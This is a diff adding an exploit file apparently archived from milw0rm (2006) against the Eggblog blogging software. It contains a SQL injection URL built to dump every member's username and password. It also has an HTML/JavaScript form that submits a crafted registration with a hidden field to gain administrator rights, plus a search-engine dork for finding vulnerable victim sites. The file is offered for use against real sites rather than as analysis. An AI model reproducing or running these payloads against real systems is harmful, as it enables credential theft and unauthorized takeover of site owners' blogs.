@@ -1,0 +1,61 @@
+<!--
+Eggblog <= 3.x Multiple Remote Vulnerabilities
+Discovered by: nukedx
+Contacts: ICQ: 10072 MSN/Mail: nukedx@nukedx.com web: http://www.nukedx.com
+Original advisory can be found at: http://www.nukedx.com/?viewdoc=36
+Eggblog <= 3.0.6 (rss/posts.php id) Remote SQL injection
+Example ->  http://[site]/[EggBlog]/rss/posts.php?id=1'/**/UNION/**/SELECT/**/0,concat('Username:%20',username),concat('Password:%20',password)/**/from/**/eggblog_members/*
+This SQL injection will list you all users and passwords.
+-->
+
+<html>
+<title>Eggblog 2.x Remote Privilege Escalation</title>
+<body bgcolor="#000000">
+<style>
+.xpl {font-family:tahoma; font-size:11px; text-decoration: none;}
+</style>
+<script language="JavaScript">
+function egxpl() {
+  if (document.xplt.victim.value=="") {
+    alert("Please enter site!");
+    return false;
+  }
+  if (confirm("Are you sure?")) {
+    xplt.action="http://"+document.xplt.victim.value+"home/register.php";
+    xplt.username.value=document.xplt.username.value;
+    xplt.email.value=document.xplt.email.value;
+    xplt.password.value=document.xplt.password.value;
+    xplt.ref=document.xplt.ref.value;
+    xplt.submit();
+  }
+}
+</script>
+<strong>
+<font class="xpl" color="#00FF40">
+<pre>
+<center>
+Welcome to Eggblog 2.x Remote Privilege Escalation
+This exploit has been coded by nukedx
+You can found original advisory on http://www.nukedx.com/?viewdoc=36
+Dork for this exploit: <u>inurl:"powered by eggblog"</u>
+Your target must be like that: www.victim.com/Path/
+The sites you found with given dork has like: www.victim.com/eggblog/home/ or www.victim.com/home/
+If the site has /eggblog/home in link your target must be www.victim.com/eggblog/
+For second example your target must be www.victim.com/
+You can login with your admin account via www.victim.com/eggblog/admin/index.php
+Have phun
+<form name="xplt" method="POST" onsubmit="egxpl();">
+Target -> <input type="text" name="victim" value="www.victim.com/Path/" size="44" class="xpl">
+<input type="text" name="username" value="Enter Username" class="xpl" size="30">
+<input type="text" name="email" value="Enter Email" class="xpl" size="30">
+<input type="text" name="password" value="Enter Password" class="xpl" size="30">
+<input type="hidden" name="ref" value="T">
+<input type="submit" value="Send" class="xpl">
+</form>
+</pre>
+</font>
+</strong>
+</body>
+</html>
+
+# milw0rm.com [2006-05-28]
